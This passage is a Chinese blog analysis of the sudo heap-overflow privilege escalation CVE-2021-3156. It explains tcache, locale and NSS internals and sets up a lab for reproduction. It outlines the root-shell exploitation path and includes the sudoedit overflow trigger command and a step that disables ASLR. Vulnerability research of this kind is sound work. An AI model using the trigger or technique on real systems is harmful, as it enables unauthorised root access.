<!DOCTYPE html>
<html lang="zh-cn">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width" />
  <script
    type="application/javascript"
    src='https://m1nn1e.github.io/js/theme-mode.js'
  ></script>
  <link rel="stylesheet" href='https://m1nn1e.github.io/css/frameworks.min.css' />
  <link rel="stylesheet" href='https://m1nn1e.github.io/css/github.min.css' />
  <link rel="stylesheet" href='https://m1nn1e.github.io/css/github-style.css' />
  <link rel="stylesheet" href='https://m1nn1e.github.io/css/light.css' />
  <link rel="stylesheet" href='https://m1nn1e.github.io/css/dark.css' />
  <link rel="stylesheet" href='https://m1nn1e.github.io/css/syntax.css' />
  
  <link rel="stylesheet" href='https://m1nn1e.github.io/css/tocbot.css' />

  <title>
    CVE-2021-3156: Sudo堆溢出提权漏洞分析 - Minnie Clubhouse
  </title>
  
  <link rel="icon" type="image/x-icon" href="/images/github.png" />
  
  <meta name="theme-color" content="#1e2327" />

  
  <meta
  name="description"
  content=" 漏洞描述: Baron Samedit [sudo in linux]
"
/>
<meta
  name="keywords"
  content='blog, security, binary, OS'
/>
<meta name="robots" content="noodp" />
<link rel="canonical" href="https://m1nn1e.github.io/post/cve-2021-3156/" />


<meta name="twitter:card" content="summary" />
<meta
  name="twitter:title"
  content="CVE-2021-3156: Sudo堆溢出提权漏洞分析 - Minnie Clubhouse"
/>
<meta
  name="twitter:description"
  content=" 漏洞描述: Baron Samedit [sudo in linux]
"
/>
<meta name="twitter:site" content="https://m1nn1e.github.io/" />
<meta name="twitter:creator" content="" />
<meta
  name="twitter:image"
  content="https://m1nn1e.github.io/"
/>


<meta
  property="og:type"
  content="article"
/>
<meta
  property="og:title"
  content="CVE-2021-3156: Sudo堆溢出提权漏洞分析 - Minnie Clubhouse"
/>
<meta
  property="og:description"
  content=" 漏洞描述: Baron Samedit [sudo in linux]
"
/>
<meta property="og:url" content="https://m1nn1e.github.io/post/cve-2021-3156/" />
<meta property="og:site_name" content="CVE-2021-3156: Sudo堆溢出提权漏洞分析" />
<meta
  property="og:image"
  content="https://m1nn1e.github.io/"
/>
<meta property="og:image:width" content="2048" />
<meta property="og:image:height" content="1024" />

<meta property="article:published_time" content="2022-06-23 18:12:48 &#43;0800 CST" />











</head>


<body>
  <div style="position: relative">
  <header class="Header js-details-container Details px-3 px-md-4 px-lg-5 flex-wrap flex-md-nowrap open Details--on">
    <div class="Header-item mobile-none" style="margin-top: -4px; margin-bottom: -4px;">
      <a class="Header-link" href="https://m1nn1e.github.io/">
        <svg class="octicon" height="32" viewBox="0 0 16 16" version="1.1" width="32">
          <path fill-rule="evenodd"
            d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z">
          </path>
        </svg>
      </a>
    </div>
    <div class="Header-item d-md-none">
      <button class="Header-link btn-link js-details-target" type="button"
        onclick="document.querySelector('#header-search').style.display = document.querySelector('#header-search').style.display == 'none'? 'block': 'none'">
        <svg height="24" class="octicon octicon-three-bars" viewBox="0 0 16 16" version="1.1" width="24">
          <path fill-rule="evenodd"
            d="M1 2.75A.75.75 0 011.75 2h12.5a.75.75 0 110 1.5H1.75A.75.75 0 011 2.75zm0 5A.75.75 0 011.75 7h12.5a.75.75 0 110 1.5H1.75A.75.75 0 011 7.75zM1.75 12a.75.75 0 100 1.5h12.5a.75.75 0 100-1.5H1.75z">
          </path>
        </svg>
      </button>
    </div>
    <div style="display: none;" id="header-search"
      class="Header-item Header-item--full flex-column flex-md-row width-full flex-order-2 flex-md-order-none mr-0 mr-md-3 mt-3 mt-md-0 Details-content--hidden-not-important d-md-flex">
      <div
        class="Header-search header-search flex-auto js-site-search position-relative flex-self-stretch flex-md-self-auto mb-3 mb-md-0 mr-0 mr-md-3 scoped-search site-scoped-search js-jump-to">
        <div class="position-relative">
          <form target="_blank" action="https://www.google.com/search" accept-charset="UTF-8" method="get"
            autocomplete="off">
            <label
              class="Header-search-label form-control input-sm header-search-wrapper p-0 js-chromeless-input-container header-search-wrapper-jump-to position-relative d-flex flex-justify-between flex-items-center">
              <input type="text"
                class="Header-search-input form-control input-sm header-search-input jump-to-field js-jump-to-field js-site-search-focus js-site-search-field is-clearable"
                name="q" value="" placeholder="Search" autocomplete="off">
              <input type="hidden" name="q" value="site:https://m1nn1e.github.io/">
            </label>
          </form>
        </div>
      </div>
    </div>

    <div class="Header-item Header-item--full flex-justify-center d-md-none position-relative">
      <a class="Header-link " href="https://m1nn1e.github.io/">
        <svg class="octicon octicon-mark-github v-align-middle" height="32" viewBox="0 0 16 16" version="1.1"
          width="32">
          <path fill-rule="evenodd"
            d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z">
          </path>
        </svg>
      </a>
    </div>
    <div class="Header-item" style="margin-right: 0;">
      <a href="javascript:void(0)" class="Header-link no-select" onclick="switchTheme()">
        <svg style="fill: var(--color-profile-color-modes-toggle-moon);" class="no-select" viewBox="0 0 16 16"
          version="1.1" width="16" height="16">
          <path fill-rule="evenodd" clip-rule="evenodd"
            d="M4.52208 7.71754C7.5782 7.71754 10.0557 5.24006 10.0557 2.18394C10.0557 1.93498 10.0392 1.68986 10.0074 1.44961C9.95801 1.07727 10.3495 0.771159 10.6474 0.99992C12.1153 2.12716 13.0615 3.89999 13.0615 5.89383C13.0615 9.29958 10.3006 12.0605 6.89485 12.0605C3.95334 12.0605 1.49286 10.001 0.876728 7.24527C0.794841 6.87902 1.23668 6.65289 1.55321 6.85451C2.41106 7.40095 3.4296 7.71754 4.52208 7.71754Z">
          </path>
        </svg>
      </a>
    </div>
  </header>
</div>
   <div style="position: relative">
    <main>
        <div class="gisthead pagehead bg-gray-light pb-0 pt-3 mb-4">
            <div class="px-0">
              <div class="mb-3 d-flex px-3 px-md-3 px-lg-5">
                <div class="flex-auto min-width-0 width-fit mr-3">
                  <div class="d-flex">
                    <div class="d-none d-md-block">
                      <a class="avatar mr-2 flex-shrink-0" href="https://m1nn1e.github.io/">
                        <img class=" avatar-user"
                          src="https://m1nn1e.github.io/images/avatar.png"
                          width="32" height="32"></a>
                    </div>

<div class="d-flex flex-column">
    <h1 class="break-word f3 text-normal mb-md-0 mb-1">
        <span class="author" id="breadcrumbs">
            <a href="/">Home</a><strong><span class="path-divider">/</span><a href="/post/cve-2021-3156">CVE-2021-3156: Sudo堆溢出提权漏洞分析</a></strong></span>
        
    </h1>
    <div class="note m-0">
      Created <relative-time datetime="Thu, 23 Jun 2022 18:12:48 &#43;0800"
        class="no-wrap">
        Thu, 23 Jun 2022 18:12:48 &#43;0800</relative-time>

      
      <span class="file-info-divider"></span>
      Modified <relative-time datetime="Fri, 23 Sep 2022 03:37:55 &#43;0800"
        class="no-wrap">
        Fri, 23 Sep 2022 03:37:55 &#43;0800</relative-time>
      
    </div>
  </div>
</div>
</div>
</div>
</div>
</div>
</main>
</div> 
<div class="js-toc-content">
  
  <div style="position: relative;">
          <div class="container-lg px-3 new-discussion-timeline" >
            
            <div class="repository-content gist-content">
              <div>
                <div class="js-gist-file-update-container js-task-list-container file-box">
                  <div id="file-pytest" class="file my-2">
                    <div id="post-header" class="file-header d-flex flex-md-items-center flex-items-start sticky-header" style="z-index: 2">
                      <div class="file-info d-flex flex-md-items-center flex-items-start flex-order-1 flex-auto" style="text-align: left;">
                        <div class="text-mono f6 flex-auto pr-3 flex-order-2 flex-md-order-1 mt-2 mt-md-0">
                          
                          <summary id="toc-toggle" onclick="clickToc()" class="btn btn-octicon m-0 mr-2 p-2">
                            <svg aria-hidden="true" viewBox="0 0 16 16" height="16" width="16" class="octicon octicon-list-unordered">
                              <path fill-rule="evenodd" d="M2 4a1 1 0 100-2 1 1 0 000 2zm3.75-1.5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zm0 5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zm0 5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zM3 8a1 1 0 11-2 0 1 1 0 012 0zm-1 6a1 1 0 100-2 1 1 0 000 2z"></path>
                            </svg>
                          </summary>
                          <details-menu class="SelectMenu" id="toc-details" style="display: none;">
                            <div class="SelectMenu-modal rounded-3 mt-1" style="max-height: 340px;">
                              <div class="SelectMenu-list SelectMenu-list--borderless p-2" style="overscroll-behavior: contain;" id="toc-list">
                              </div>
                            </div>
                          </details-menu>
                            11641 Words
                          
      
                        </div>
                        <div class="file-actions flex-order-2 pt-0">
                          
                          
                          <a class="muted-link mr-3" href="/tags/vuln_analysis">
                            <svg class="octicon octicon-tag" viewBox="0 0 16 16" version="1.1" width="16" height="16">
                              <path fill-rule="evenodd"
                                d="M2.5 7.775V2.75a.25.25 0 01.25-.25h5.025a.25.25 0 01.177.073l6.25 6.25a.25.25 0 010 .354l-5.025 5.025a.25.25 0 01-.354 0l-6.25-6.25a.25.25 0 01-.073-.177zm-1.5 0V2.75C1 1.784 1.784 1 2.75 1h5.025c.464 0 .91.184 1.238.513l6.25 6.25a1.75 1.75 0 010 2.474l-5.026 5.026a1.75 1.75 0 01-2.474 0l-6.25-6.25A1.75 1.75 0 011 7.775zM6 5a1 1 0 100 2 1 1 0 000-2z">
                              </path>
                            </svg>
                            vuln_analysis
                          </a>
                          
                          
                        </div>
                      </div>
                    </div>
      
      
                    <div class="Box-body px-5 pb-5" style="z-index: 1">
                      <article class="markdown-body entry-content container-lg"><blockquote>
<p>漏洞描述:  Baron Samedit [sudo in linux]</p>
</blockquote>
<h2 id="0x00-漏洞摘要">0x00 漏洞摘要</h2>
<ul>
<li>漏洞影响程序 &amp; 版本范围
<ul>
<li>sudo 1.8.2 - 1.8.31p2</li>
<li>sudo 1.9.0 - 1.9.5p1（1.9.5p2安全）</li>
</ul>
</li>
<li>可成功验证系统：
<ul>
<li>Ubuntu 20.04（Sudo 1.8.31）</li>
<li>Debian 10（Sudo 1.8.27）</li>
<li>Fedora 33（Sudo 1.9.2）</li>
</ul>
</li>
<li>漏洞类型
<ul>
<li>Linux环境下的堆溢出漏洞(off by one, rce)</li>
</ul>
</li>
<li>漏洞影响
<ul>
<li>【提权】非root权限的用户在shell中使用默认的sudo配置，无需任何验证信息(包括该用户密码)，可获得root权限</li>
</ul>
</li>
<li>漏洞成因（原理程度+具体代码程度）
<ul>
<li><code>sudo</code>通过 <code>-s</code> 或<code>-i</code>参数在 <code>shell -c</code>模式下运行命令时会使用反斜杠<code>\</code>转义特殊字符。但使用<code>-s/-i</code>参数运行<code>sudoedit</code>时，实际上并未进行转义。若传入的参数以反斜杠<code>\</code>结尾，则在插件<code>sudoer</code>的<code>set_cmnd</code>函数中向<code>user_args</code>拷贝参数时，会发生越界拷贝，导致堆溢出</li>
</ul>
</li>
<li>漏洞利用关键环节
<ul>
<li>利用新型tcache的特性（tcache bins）</li>
<li>巧妙利用linux系统设置<code>locale</code>，通过传递<code>LC_</code>环境变量进行chunk构造</li>
<li>利用<code>nss</code>库中的<code>nss_load_library</code>函数来加载伪造库，执行伪造库中的<code>_init</code>函数实现getshell</li>
</ul>
</li>
</ul>
<h2 id="0x01-背景知识">0x01 背景知识</h2>
<h3 id="程序介绍">程序介绍</h3>
<ul>
<li><code>sudo</code>：linux下，使得非root权限用户可以以 root 用户的身份运行某一命令（该用户要添加到<code>/etc/sudoers</code>文件中，切换时输入该用户的密码）
<ul>
<li>类似的<code>su</code>则是切换到另一个用户（需要输入待切换用户的密码）</li>
</ul>
</li>
</ul>
<h3 id="glibc新功能tcache">glibc新功能：tcache</h3>
<ul>
<li>
<p>是glibc2.26+后引进的技术，目的是提升堆管理性能，舍弃了一些安全性</p>
</li>
<li>
<p>tcache功能</p>
<ul>
<li>tcache是Per-thread Cache，<strong>每个线程</strong>拥有一个</li>
<li>tcache遵循跟fast bins相似的LIFO机制</li>
<li>tcache针对每个线程创建tcache bins，最多64个，每个bin存放最多7个chunk，最大大小为<code>0x410</code></li>
<li>优先顺序tcache bins &gt; fast bins（free时先存到tcache，malloc时先从tcache中获取），缓存<strong>非large chunk的chunk</strong></li>
</ul>
</li>
<li>
<p>tcache结构</p>
<ul>
<li>
<p>开启tcache时的define，设置了tcache bins的基础信息</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="cp">#if USE_TCACHE
</span><span class="cp"></span><span class="cm">/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */</span>
<span class="cp"># define TCACHE_MAX_BINS        64
</span><span class="cp"># define MAX_TCACHE_SIZE    tidx2usize (TCACHE_MAX_BINS-1)
</span><span class="cp"></span>
<span class="cm">/* Only used to pre-fill the tunables.  */</span>
<span class="cp"># define tidx2usize(idx)    (((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)
</span><span class="cp"></span>
<span class="cm">/* When &#34;x&#34; is from chunksize().  */</span>
<span class="cp"># define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)
</span><span class="cp"></span><span class="cm">/* When &#34;x&#34; is a user-provided size.  */</span>
<span class="cp"># define usize2tidx(x) csize2tidx (request2size (x))
</span><span class="cp"></span>
<span class="cm">/* With rounding and alignment, the bins are...
</span><span class="cm">   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)
</span><span class="cm">   idx 1   bytes 25..40 or 13..20
</span><span class="cm">   idx 2   bytes 41..56 or 21..28
</span><span class="cm">   etc.  */</span>

<span class="cm">/* This is another arbitrary limit, which tunables can change.  Each
</span><span class="cm">   tcache bin will hold at most this number of chunks.  */</span>
<span class="cp"># define TCACHE_FILL_COUNT 7
</span><span class="cp">#endif
</span></code></pre></div></li>
<li>
<p><code>tcache_entry</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="k">typedef</span> <span class="k">struct</span> <span class="nc">tcache_entry</span>
<span class="p">{</span>
  <span class="k">struct</span> <span class="nc">tcache_entry</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span> <span class="c1">// 指向下一个chunk的fd字段
</span><span class="c1"></span>                          <span class="c1">// fast bin指向的是prev_size
</span><span class="c1"></span><span class="p">}</span> <span class="n">tcache_entry</span><span class="p">;</span>
</code></pre></div></li>
<li>
<p><code>tcache_prethread_struct</code>，链表管理结构</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="k">typedef</span> <span class="k">struct</span> <span class="nc">tcache_perthread_struct</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">counts</span><span class="p">[</span><span class="n">TCACHE_MAX_BINS</span><span class="p">];</span>
  <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">entries</span><span class="p">[</span><span class="n">TCACHE_MAX_BINS</span><span class="p">];</span>
<span class="p">}</span> <span class="n">tcache_perthread_struct</span><span class="p">;</span>

<span class="k">static</span> <span class="n">__thread</span> <span class="n">tcache_perthread_struct</span> <span class="o">*</span><span class="n">tcache</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</code></pre></div><p>对每个线程创建的结构</p>
<ul>
<li><code>counts</code>数组记录当前tcache bins个数</li>
<li><code>entries</code>数组中每个指针指向其对应的tcache bin的chunk块，单链表</li>
</ul>
</li>
</ul>
<p><a href="https://s2.loli.net/2022/09/23/1LsUfFupzIcCiVv.png"></a></p>
</li>
<li>
<p>tcache规则</p>
<ul>
<li>从fastbin中取出一块后，剩余部分放入tcache中（small bin也是）</li>
<li>遍历unsorted bin后，若tcache bin中有匹配大小的chunk则首先取出</li>
<li>unsorted达到limit限制时（默认无限制），已经存入过chunk的取出</li>
</ul>
</li>
<li>
<p><code>nss</code>、<code>locale</code>：linux下配置</p>
<blockquote>
<p><a href="https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/">Libc Realpath Buffer Underflow (halfdog.net)</a></p>
</blockquote>
<ul>
<li>
<p><code>locale</code>配置介绍</p>
<ul>
<li>
<p>locale是linux下根据用户的语言和地理位置定义的软件运行时的语言环境，通过环境变量进行设置</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">p</span> <span class="n">_nl_category_names</span>
<span class="err">$</span><span class="mi">1</span> <span class="o">=</span> <span class="p">{</span>
  <span class="n">str41</span> <span class="o">=</span> <span class="s">&#34;LC_COLLATE&#34;</span><span class="p">,</span>
  <span class="n">str67</span> <span class="o">=</span> <span class="s">&#34;LC_CTYPE&#34;</span><span class="p">,</span>
  <span class="n">str140</span> <span class="o">=</span> <span class="s">&#34;LC_MONETARY&#34;</span><span class="p">,</span>
  <span class="n">str193</span> <span class="o">=</span> <span class="s">&#34;LC_NUMERIC&#34;</span><span class="p">,</span>
  <span class="n">str207</span> <span class="o">=</span> <span class="s">&#34;LC_TIME&#34;</span><span class="p">,</span>
  <span class="n">str259</span> <span class="o">=</span> <span class="s">&#34;LC_MESSAGES&#34;</span><span class="p">,</span>
  <span class="n">str270</span> <span class="o">=</span> <span class="s">&#34;LC_PAPER&#34;</span><span class="p">,</span>
  <span class="n">str279</span> <span class="o">=</span> <span class="s">&#34;LC_NAME&#34;</span><span class="p">,</span>
  <span class="n">str292</span> <span class="o">=</span> <span class="s">&#34;LC_ADDRESS&#34;</span><span class="p">,</span>
  <span class="n">str311</span> <span class="o">=</span> <span class="s">&#34;LC_TELEPHONE&#34;</span><span class="p">,</span>
  <span class="n">str322</span> <span class="o">=</span> <span class="s">&#34;LC_MEASUREMENT&#34;</span><span class="p">,</span>
  <span class="n">str330</span> <span class="o">=</span> <span class="s">&#34;LC_IDENTIFICATION&#34;</span>
<span class="p">}</span>
</code></pre></div><p><img src="https://s2.loli.net/2022/09/23/cJ1TpMivlENm3rs.png" alt=""></p>
<ul>
<li><code>LANG</code>开头的是进行语言&amp;编码设置,<code>zh_CN.UTF-8</code></li>
<li><code>LC_ALL</code>可通过<code>setlocale</code>进行设置，其值可以覆盖所有其他的<code>locale</code>设定，空白则设置为<code>C</code></li>
<li><code>LC_XXX</code>详细设定<code>locale</code>的各个方面，可以覆盖<code>LANG</code>的值</li>
<li>当<code>LC_ALL/LANG</code>被设置为<code>C</code>的时候，<code>LANGUAGE</code>的值将会被忽略</li>
<li>在程序动态调试中可通过<code>_nl_category_names</code>查看</li>
</ul>
</li>
<li>
<p><code>language</code>是<a href="https://zh.wikipedia.org/wiki/ISO_639-1">ISO 639-1</a>标准中定义的双字母的语言代码，<code>territory</code>是<a href="https://zh.wikipedia.org/wiki/ISO_3166-1">ISO 3166-1</a>标准中定义的双字母的国家和地区代码，<code>codeset</code>是字符集的名称 (如 UTF-8等)，而 <code>modifier</code> 则是某些<code>locale</code>变体的修正符</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="n">language</span><span class="p">[</span><span class="n">_territory</span><span class="p">[.</span><span class="n">codeset</span><span class="p">]][</span><span class="err">@</span><span class="n">modifier</span><span class="p">]</span>
</code></pre></div></li>
</ul>
</li>
<li>
<p><code>nss</code>解析介绍</p>
<ul>
<li>
<p>nss介绍</p>
<p>全称为Name Service Switch，是解析name类型字符串的c语言库</p>
<ul>
<li>
<p><code>ls -alg</code>: 系统中只保存了用户和用户组的<code>id</code>，要想显示与之相关的字符这就需要<code>nss</code>进行解析</p>
<p><img src="https://s2.loli.net/2022/09/23/ap2zwTiVnjJBmQh.png" alt=""></p>
</li>
<li>
<p>通过<code>/etc/nsswitch.conf</code>进行配置</p>
<p>左边是支持的服务<code>service</code>，右边是定义的查找范围</p>
<ul>
<li>对于每个<code>service</code>都必须有文件<code>libnss_service.so.2</code>与之对应</li>
<li>例如<code>group</code>数据库定义了查找规范<code>files</code>，那么在调用<code>getgroup</code>函数的时候就会调用<code>libnss_files.so.2</code>中的<code>__nss_lookup_function</code>函数进行查找</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># /etc/nsswitch.conf</span>
<span class="c1">#</span>
<span class="c1"># Example configuration of GNU Name Service Switch functionality.</span>
<span class="c1"># If you have the `glibc-doc-reference&#39; and `info&#39; packages installed, try:</span>
<span class="c1"># `info libc &#34;Name Service Switch&#34;&#39; for information about this file.</span>

passwd:         files systemd
group:          files systemd
shadow:         files
gshadow:        files

hosts:          files dns
networks:       files

protocols:      db files
services:       db files
ethers:         db files
rpc:            db files

netgroup:       nis
</code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="n">libnss_compat</span><span class="o">-</span><span class="mf">2.31</span><span class="p">.</span><span class="n">so</span>
<span class="n">libnss_compat</span><span class="p">.</span><span class="n">so</span>
<span class="n">libnss_compat</span><span class="p">.</span><span class="n">so</span><span class="mf">.2</span>
<span class="n">libnss_dns</span><span class="o">-</span><span class="mf">2.31</span><span class="p">.</span><span class="n">so</span>
<span class="n">libnss_dns</span><span class="p">.</span><span class="n">so</span>
<span class="n">libnss_dns</span><span class="p">.</span><span class="n">so</span><span class="mf">.2</span>
<span class="n">libnss_files</span><span class="o">-</span><span class="mf">2.31</span><span class="p">.</span><span class="n">so</span>
<span class="n">libnss_files</span><span class="p">.</span><span class="n">so</span>
<span class="n">libnss_files</span><span class="p">.</span><span class="n">so</span><span class="mf">.2</span>
<span class="n">libnss_hesiod</span><span class="o">-</span><span class="mf">2.31</span><span class="p">.</span><span class="n">so</span>
<span class="n">libnss_hesiod</span><span class="p">.</span><span class="n">so</span>
<span class="n">libnss_hesiod</span><span class="p">.</span><span class="n">so</span><span class="mf">.2</span>
<span class="n">libnss_nis</span><span class="o">-</span><span class="mf">2.31</span><span class="p">.</span><span class="n">so</span>
<span class="n">libnss_nis</span><span class="p">.</span><span class="n">so</span>
<span class="n">libnss_nis</span><span class="p">.</span><span class="n">so</span><span class="mf">.2</span>
<span class="n">libnss_nisplus</span><span class="o">-</span><span class="mf">2.31</span><span class="p">.</span><span class="n">so</span>
<span class="n">libnss_nisplus</span><span class="p">.</span><span class="n">so</span>
<span class="n">libnss_nisplus</span><span class="p">.</span><span class="n">so</span><span class="mf">.2</span>
<span class="n">libnss_systemd</span><span class="p">.</span><span class="n">so</span><span class="mf">.2</span>
</code></pre></div></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="0x02-复现环境">0x02 复现环境</h2>
<h3 id="环境配置">环境配置</h3>
<p>由于本地环境暂时没有满足要求的可用虚拟机，这里采用virtual box的Ubuntu 20.04LTS虚拟机环境进行复现</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># 确保开通root用户后，关闭aslr</span>
sudo <span class="nb">echo</span> <span class="m">0</span> &gt; /proc/sys/kernel/randomize_va_space
</code></pre></div><p>编译并安装<code>1.8.31p1</code>版本的<code>sudo</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="l">wget https://www.sudo.ws/dist/sudo-1.8.31p1.tar.gz</span><span class="w">
</span><span class="w"></span><span class="l">tar -xzvf sudo-1.8.31p1.tar.gz</span><span class="w">
</span><span class="w"></span><span class="l">cd sudo-1.8.31p1</span><span class="w">
</span><span class="w"></span><span class="l">mkdir build</span><span class="w">
</span><span class="w"></span><span class="l">cd build</span><span class="w">
</span><span class="w"></span><span class="l">../configure --enable-env-debug</span><span class="w">
</span><span class="w"></span><span class="l">make -j</span><span class="w">
</span><span class="w"></span><span class="l">sudo make install</span><span class="w">
</span><span class="w">
</span><span class="w"></span><span class="c"># 完成后即可通过gdb动态调试</span><span class="w">
</span><span class="w"></span><span class="l">su test</span><span class="w"> </span><span class="c"># 切换到非root用户</span><span class="w">
</span><span class="w"></span><span class="l">sudo gdb --args sudoedit -s &#39;\&#39; `perl -e &#39;print &#34;A&#34; x 65536&#39;`</span><span class="w">
</span></code></pre></div><p>查看系统相关信息：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># sudo --version</span>
Sudo version 1.8.31

<span class="c1"># lsb_release -a</span>
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 20.04 LTS
Release:        20.04
Codename:       focal
</code></pre></div><p>系统glibc版本为<code>2.31</code>，有新增的tcache功能且默认开启</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="err">$</span> <span class="n">ldd</span> <span class="o">--</span><span class="n">version</span>
<span class="n">ldd</span> <span class="p">(</span><span class="n">Ubuntu</span> <span class="n">GLIBC</span> <span class="mf">2.31</span><span class="o">-</span><span class="mi">0u</span><span class="n">buntu9</span><span class="p">)</span> <span class="mf">2.31</span>
<span class="n">Copyright</span> <span class="p">(</span><span class="n">C</span><span class="p">)</span> <span class="mi">2020</span> <span class="n">Free</span> <span class="n">Software</span> <span class="n">Foundation</span><span class="p">,</span> <span class="n">Inc</span><span class="p">.</span>
<span class="n">This</span> <span class="n">is</span> <span class="n">free</span> <span class="n">software</span><span class="p">;</span> <span class="n">see</span> <span class="n">the</span> <span class="n">source</span> <span class="k">for</span> <span class="n">copying</span> <span class="n">conditions</span><span class="p">.</span>  <span class="n">There</span> <span class="n">is</span> <span class="n">NO</span>
<span class="n">warranty</span><span class="p">;</span> <span class="n">not</span> <span class="n">even</span> <span class="k">for</span> <span class="n">MERCHANTABILITY</span> <span class="n">or</span> <span class="n">FITNESS</span> <span class="n">FOR</span> <span class="n">A</span> <span class="n">PARTICULAR</span> <span class="n">PURPOSE</span><span class="p">.</span>
<span class="n">Written</span> <span class="n">by</span> <span class="n">Roland</span> <span class="n">McGrath</span> <span class="n">and</span> <span class="n">Ulrich</span> <span class="n">Drepper</span><span class="p">.</span>
</code></pre></div><p>创建非root用户<code>test</code>用于复现</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">useradd <span class="nb">test</span>
passwd <span class="nb">test</span> <span class="c1"># 设置密码</span>
su <span class="nb">test</span> <span class="c1"># 切换用户</span>
</code></pre></div><p>所需程序&amp;repo安装</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">sudo apt install -y make gcc git python3 python3-pip#with libheap <span class="p">&amp;</span> gef
git clone 
</code></pre></div><h2 id="0x03-漏洞机理">0x03 漏洞机理</h2>
<p>为了方便分析，获取对应<a href="https://www.sudo.ws/dist/sudo-1.8.31p1.tar.gz">sudo1.8.31的源码</a>进行分析</p>
<ul>
<li>
<p>源码追踪</p>
<p>首先在目录下根据经验访问<code>src/</code>下找到<code>sudo.h</code>和<code>sudo.c</code>，认为应该为入口源码（或者通过接收输入参数的相关关键词搜寻）</p>
<ul>
<li>
<p>在<code>sudo.h</code>中可以看到各种define了各种标志位的对应值，其中这些<code>MODE_</code>开头的标志位中重点关注</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="cm">/*
</span><span class="cm"> * Various modes sudo can be in (based on arguments) in hex
</span><span class="cm"> */</span>
<span class="cp">#define MODE_RUN		0x00000001
</span><span class="cp">#define MODE_EDIT		0x00000002
</span><span class="cp">#define MODE_VALIDATE		0x00000004
</span><span class="cp">#define MODE_INVALIDATE		0x00000008
</span><span class="cp">#define MODE_KILL		0x00000010
</span><span class="cp">#define MODE_VERSION		0x00000020
</span><span class="cp">#define MODE_HELP		0x00000040
</span><span class="cp">#define MODE_LIST		0x00000080
</span><span class="cp">#define MODE_CHECK		0x00000100
</span><span class="cp">#define MODE_MASK		0x0000ffff
</span><span class="cp"></span>
<span class="cm">/* Mode flags */</span>
<span class="cm">/* XXX - prune this */</span>
<span class="cp">#define MODE_BACKGROUND		0x00010000
</span><span class="cp">#define MODE_SHELL		0x00020000
</span><span class="cp">#define MODE_LOGIN_SHELL	0x00040000
</span><span class="cp">#define MODE_IMPLIED_SHELL	0x00080000
</span><span class="cp">#define MODE_RESET_HOME		0x00100000
</span><span class="cp">#define MODE_PRESERVE_GROUPS	0x00200000
</span><span class="cp">#define MODE_PRESERVE_ENV	0x00400000
</span><span class="cp">#define MODE_NONINTERACTIVE	0x00800000
